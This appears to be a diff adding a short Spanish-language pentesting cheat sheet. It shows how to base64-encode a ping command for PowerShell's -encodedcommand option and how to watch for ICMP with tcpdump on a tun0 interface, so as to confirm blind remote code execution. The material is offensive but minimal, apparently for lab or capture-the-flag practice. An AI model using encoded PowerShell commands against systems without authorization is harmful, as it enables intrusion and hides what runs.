@@ -1,0 +1,11 @@
+
+::: echo -n "ping -c 4 miIpHere" | xxd 
+
+::: echo -n "ping -c 4 miIpHere" | iconv -t utf-16le | xxd			"los puntos son necesarios para windows...!!!"
+
+::: echo -n "ping -c 4 miIpHere" | iconv -t utf-16le | base64
+
+	 windows::: cmd /c powershell -encodedcommand  commandBase64Here
+
+
+						linux::: sudo tcpdump -i tun0 icmp -n				"recibir ping RCE"
